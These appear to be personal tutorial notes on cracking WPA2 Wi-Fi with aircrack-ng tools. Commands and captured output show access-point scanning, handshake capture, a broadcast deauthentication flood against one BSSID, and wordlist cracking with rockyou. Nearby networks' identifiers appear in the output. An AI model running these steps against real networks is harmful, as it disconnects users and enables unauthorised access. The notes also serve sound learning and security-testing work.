set up kernel modules for [rtl8812au](https://github.com/Wodajo/Linux-projects/blob/main/installation/rtl%20kernel%20module%20installation.md) on arch-linux (with blackarch repo)  

[set up NIC](https://github.com/Wodajo/Linux-projects/blob/main/installation/rtl%20NIC%20setting%20up.md)

##### airodump - aireplay
`sudo airmon-ng check kill` - kill conflicting processes

`sudo airodump-ng wlp0s26u1u2` - discover access point.
```
 CH  7 ][ Elapsed: 0 s ][ 2022-07-02 00:38 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 C0:06:C3:44:C2:0A  -72       11        0    0   7  540   WPA2 CCMP   PSK  HH71VM_B30E_2.4G_E
 F0:51:36:27:7C:47  -44       10        0    0   1  270   WPA2 CCMP   PSK  HH71VM_7C47_2.4G  
 0C:71:8C:44:B3:0E  -65       12        0    0   7  130   WPA2 CCMP   PSK  HH71VM_B30E_2.4G  
 2E:0E:3D:7F:34:5D  -48       12        1    0  11  130   WPA2 CCMP   PSK  Hic_habitat_felici

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 ```
BSSID (MAC address) - 2E:0E:3D:7F:34:5D
CH (channel) - 7

`sudo airodump-ng -w hack1 -c 11 --bssid 2E:0E:3D:7F:34:5D wlp0s26u1u2`
```
00:41:32  Created capture file "hack1-02.cap".





 CH 11 ][ Elapsed: 2 mins ][ 2022-07-02 00:43 ][ WPA handshake: 2E:0E:3D:7F:34:5D 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 2E:0E:3D:7F:34:5D  -45 100     1189      625    0  11  130   WPA2 CCMP   PSK  Hic_habitat_felicitas                                  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 2E:0E:3D:7F:34:5D  B8:08:CF:3C:7B:1E  -44    1e-24e     0      844  EAPOL
```

to deauthenticate:
`sudo aireplay-ng --deauth 0 -a 2E:0E:3D:7F:34:5D wlp0s26u1u2`
```
0:42:44  Waiting for beacon frame (BSSID: 2E:0E:3D:7F:34:5D) on channel 11
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
00:42:44  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:45  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:45  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:46  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:46  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:47  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:47  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:48  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:48  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:48  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:49  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:49  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:50  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:50  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
00:42:51  Sending DeAuth (code 7) to broadcast -- BSSID: [2E:0E:3D:7F:34:5D]
```

previous command captured 4way handshake and stored hash (sent by dev trying to reauth into) -> crack with hashcat/john

OR

with `aircrack` (wrapper for _____)
`aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt`

You can open `hack1-01.cap` with wireshark. use filter `eapol` to show handshake
##### wifite
wrapper for `airodump`, `aireplay` and `aircrack`. Automates stuff, and is colorfull
